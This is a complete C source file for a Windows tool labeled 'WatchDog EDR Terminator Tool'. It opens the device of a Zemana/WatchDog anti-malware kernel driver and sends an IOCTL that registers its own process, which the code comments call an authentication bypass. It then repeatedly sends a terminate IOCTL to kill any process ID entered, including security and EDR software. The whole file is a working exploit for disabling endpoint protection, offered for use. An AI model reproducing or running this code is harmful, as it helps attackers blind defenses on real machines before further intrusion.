#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Define the IOCTL codes
#define IOCTL_REGISTER_PROCESS   0x80002010
#define IOCTL_TERMINATE_PROCESS  0x80002048

// Define the device names
#define ZAM_DEVICE_NAME L"\\\\.\\amsdk"
#define ZAM_GUARD_DEVICE_NAME L"\\\\.\\B5A6B7C9-1E31-4E62-91CB-6078ED1E9A4F"

// Define NTSTATUS values
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)

typedef struct _TERMINATE_PROCESS_REQUEST {
    DWORD ProcessId;
    DWORD WaitForExit;
} TERMINATE_PROCESS_REQUEST, * PTERMINATE_PROCESS_REQUEST;

HANDLE OpenZamDevice() {
    HANDLE hDevice = CreateFileW(
        ZAM_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        hDevice = CreateFileW(
            ZAM_GUARD_DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
    }

    return hDevice;
}

BOOL RegisterCurrentProcess(HANDLE hDevice) {
    DWORD bytesReturned = 0;
    DWORD pid = GetCurrentProcessId();

    printf("Attempting to register process %d...\n", pid);

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_REGISTER_PROCESS,
        &pid,
        sizeof(pid),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("Successfully registered process %d\n", pid);
    }
    else {
        printf("Failed to register process. Error: %d\n", GetLastError());
    }

    return result;
}

BOOL TerminateProcessByPid(HANDLE hDevice, DWORD pid, BOOL waitForExit) {
    DWORD bytesReturned = 0;

    TERMINATE_PROCESS_REQUEST request;
    request.ProcessId = pid;
    request.WaitForExit = waitForExit ? 1 : 0;

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_TERMINATE_PROCESS,
        &request,
        sizeof(request),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("Successfully sent terminate request for PID %d\n", pid);
    }
    else {
        printf("Failed to terminate process. Error: %d\n", GetLastError());
    }

    return result;
}

int main() {
    DWORD pid;
    int waitOption;
    char input[256];

    printf("WatchDog EDR Terminator Tool @j3h4ck\n");
    printf("================================================\n\n");

    // Open device
    HANDLE hDevice = OpenZamDevice();
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open Zam device. Error: %d\n", GetLastError());
        return 1;
    }
    printf("Successfully opened Zam device\n");

    // Bypass authentication by registering first
    if (!RegisterCurrentProcess(hDevice)) {
        printf("Authentication bypass failed. Trying without registration...\n");
    }
    while (true) {
        // Get target PID
        printf("\nEnter PID to terminate: ");
        if (fgets(input, sizeof(input), stdin) == NULL) {
            printf("Error reading input.\n");
            CloseHandle(hDevice);
            return 1;
        }
        pid = strtoul(input, NULL, 10);

        printf("Wait for process exit? (0 = No, 1 = Yes): ");
        if (fgets(input, sizeof(input), stdin) == NULL) {
            printf("Error reading input.\n");
            CloseHandle(hDevice);
            return 1;
        }
        waitOption = atoi(input);

        printf("\nAttempting to terminate PID %lu...\n", pid);

        // Try to terminate
        if (TerminateProcessByPid(hDevice, pid, waitOption)) {
            printf("Terminate request completed successfully.\n");
        }
        else {
            printf("Terminate request failed.\n");
        }
    }
    CloseHandle(hDevice);
    return 0;
}